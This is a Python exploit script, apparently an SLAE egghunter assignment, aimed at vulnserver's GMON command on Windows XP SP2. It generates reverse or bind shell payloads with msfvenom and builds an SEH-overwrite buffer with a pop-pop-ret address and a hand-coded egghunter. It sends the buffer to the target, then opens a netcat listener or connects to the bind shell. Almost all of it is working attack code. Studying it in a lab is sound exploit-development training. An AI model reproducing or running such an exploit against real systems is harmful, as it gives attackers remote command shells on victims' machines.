#!/usr/bin/python
# vulnserver on Windows XP SP2 English x86

import socket
import subprocess
import argparse
import sys
import os

parser = argparse.ArgumentParser(description="Egghunter SLAE assignment 3")
parser.add_argument('-ip', '--ipaddress', help='defines the IP for the attacked server', dest='ip')
parser.add_argument('-p', '--port', help='defines the port of the attacked server', dest='port')
parser.add_argument('-pl', '--payload', help='bind or reverse', dest='payload')
parser.add_argument('-ncip', '--ncip', help='defines the own ip for the reverse shell', dest='ncip')
parser.add_argument('-ncp', '--ncport', help='defines the own port for the reverse shell, choose port 1024 to 65535', dest='ncport')
results = parser.parse_args()

results.port = int(results.port)

if results.port < 1024 or results.port > 65535:
    sys.exit()

host = "LHOST={}".format(results.ncip)
port = "LPORT={}".format(str(results.ncport))

if results.payload == "reverse":
    p = subprocess.Popen(
        ["msfvenom", "-p", "windows/shell_reverse_tcp", host, port, "-f", "python", "-b",  "'\\x00'", "-v", "shellcode",
         "EXITFUNC=thread"], stdout=subprocess.PIPE)
elif results.payload == "bind":
    p = subprocess.Popen(
        ["msfvenom", "-p", "windows/shell_bind_tcp", port, "-f", "python", "-b", "'\\x00'", "-v", "shellcode",
         "EXITFUNC=thread"], stdout=subprocess.PIPE)
(output, err) = p.communicate()
p_status = p.wait()

# IMPORT IN THE MIDDLE OF A SCRIPT IS NOT GOOD PRACTICE AND ONLY USED EXCEPTIONALLY!!!
# import the new created shellcode from the msfvenom-output
# we can't import byte code in python2 directly because it's get messed up
import shellcode

nseh = "\xeb\xc4\x90\x90" #jmp back 60 bytes
seh = "\x2b\x17\x50\x62" #pop pop ret from essfunc.dll

#egg b33f
#size 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

egg = "b33fb33f"

buffer = "GMON /.:/"
buffer += egg
buffer += "\x90" * 50
buffer += shellcode.shellcode
buffer += "A" * (3495 - len(egg) - len(shellcode.shellcode) - 58 - 50)
buffer += egghunter
buffer += "A" * (58 - len(egghunter))
buffer += nseh
buffer += seh
buffer += "C" * (5011 - len(buffer))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((results.ip, results.port))
expl.send(buffer)
expl.close()


if results.payload == "reverse":
    print("Exploit sent! Creating netcat listener and waiting for shell...")
    os.system("nc -lvp {}".format(results.ncport))
elif results.payload == "bind":
    print("Exploit sent! Connect to host...")
    os.system("nc {} {}".format(results.ip, results.ncport))